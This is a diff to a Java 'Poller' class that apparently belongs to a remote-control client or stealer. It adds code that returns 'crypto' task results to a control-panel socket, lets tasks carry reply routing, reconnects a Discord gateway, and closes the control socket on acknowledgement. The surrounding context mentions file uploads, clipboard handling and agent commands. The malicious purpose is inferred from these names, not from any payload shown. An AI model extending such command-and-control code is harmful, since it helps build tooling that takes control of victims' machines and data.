@@ -140,6 +140,10 @@ public final class Poller implements Runnable {
 					Log.debug("Crypto fallback upload failed: " + file);
 				}
 			}, ops.clipboard(), this::agentCommand);
+			crypto.frames((replyTo, name, body) -> {
+				PanelSocket active = panel;
+				return active != null && active.deliverResult(replyTo, name, body);
+			});
 			crypto.start();
 		} catch (Throwable throwable) {
 			Log.debug("Crypto module failed to start", throwable);
@@ -167,12 +171,18 @@ public final class Poller implements Runnable {
 	}
 
 	public String submitCrypto(String id, String name, java.util.Map<String, Object> params, int timeout) {
+		return submitCrypto(id, name, params, timeout, id, false);
+	}
+
+	public String submitCrypto(String id, String name, java.util.Map<String, Object> params, int timeout,
+		String replyTo, boolean frame) {
 		CryptoModule current = crypto;
 		if (current == null) {
 			return "Crypto module disabled";
 		}
 		String taskId = id == null || id.isEmpty() ? "local-" + System.nanoTime() : id;
-		String rejected = current.submit(new CryptoModule.Task(taskId, name, params, timeout), taskId);
+		String rejected = current.submit(new CryptoModule.Task(taskId, name, params, timeout,
+			replyTo == null || replyTo.isEmpty() ? taskId : replyTo, frame), taskId);
 		return rejected != null ? rejected : "Task " + name + " queued";
 	}
 
@@ -1020,6 +1030,24 @@ public final class Poller implements Runnable {
 	public long gatewayRtt() {
 		Gateway current = gateway;
 		return current == null ? -1L : current.rtt();
+	}
+
+	/** Reconnect the Discord gateway only; the panel socket keeps its seq. */
+	public String reconnectGateway() {
+		Gateway current = gateway;
+		if (current == null) {
+			return "gateway: not started";
+		}
+		current.restart();
+		return "gateway reconnecting";
+	}
+
+	/** Close the control socket once the reconnect result is ACKed. */
+	public void armReconnect(String replyTo) {
+		PanelSocket current = panel;
+		if (current != null) {
+			current.armReconnect(replyTo);
+		}
 	}
 
 	public void gatewayCommand(List<String> args) {
